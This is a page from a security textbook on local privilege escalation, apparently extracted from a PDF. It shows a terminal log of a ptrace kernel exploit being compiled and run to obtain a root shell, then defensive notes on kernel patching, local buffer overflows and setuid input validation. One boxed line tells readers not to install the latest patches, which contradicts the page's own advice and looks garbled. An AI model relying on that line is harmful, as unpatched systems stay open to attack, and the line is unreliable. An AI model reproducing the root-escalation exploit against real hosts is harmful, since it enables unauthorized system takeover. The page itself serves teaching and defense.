# 116 Part I: Hacking Techniques and Defenses

Length: unspecified [text/html]

```
[ <== ] 2,046 275.07K/s
```

```
17:03:52 (275.07 KB/s) - 'ptrace.c' saved [2046]
[bash]$ gcc -o ptrace ptrace.c
[bash]$ ./ptrace
[+] Attached to 11862
[+] Waiting for signal
[+] Signal caught
[+] Shellcode placed at 0x4000ed4d
[+] Now wait for suid shell...
sh-2.0.5# id
uid=0(root) gid=0(root) groups=0(root), 1(bin), 2(daemon), 3(sys), 4(adm), 6(disk), 10(wheel)
```

Please use http://securityfocus.com/bid/3447 for more information.

![](bbox=[0.085, 0.383, 0.125, 0.417])

# Update or Patch the Kernel

Usually, patches for kernel vulnerabilities are promptly released by the kernel developers. Make sure to install patches immediately before they are exposed to malicious users.

# Local Buffer Overflows

Please refer to Chapter 4 for an introduction to buffer overflow attacks. Local applications and services are also susceptible to buffer overflow-attacks. For example, the "HP-UX IPCS Core File Buffer Overflow Vulnerability" was caused by improper bounds checking of core filenames. The ipcs program susceptible to this vulnerability could be exploited by local users to gain root privileges on the victim host. Details of this vulnerability are available at http://securityfocus.com/bid/7216.

![](bbox=[0.125, 0.686, 0.163, 0.712])

> Do not install the latest patches against local applications and services. See Chapter 9 for more information.

# Improper Input Validation

It is very important to perform input validation on programs that accept input parameters. Setuid programs execute with the privileges of the root user, and therefore a minor input validation flaw may allow a local user to execute commands with supervise privileges.

As an example, consider the runpr utility, which was found to be vulnerable to privilege escalation due to an improper input validation condition. See http://securityfocus.com/bid/6077 for details.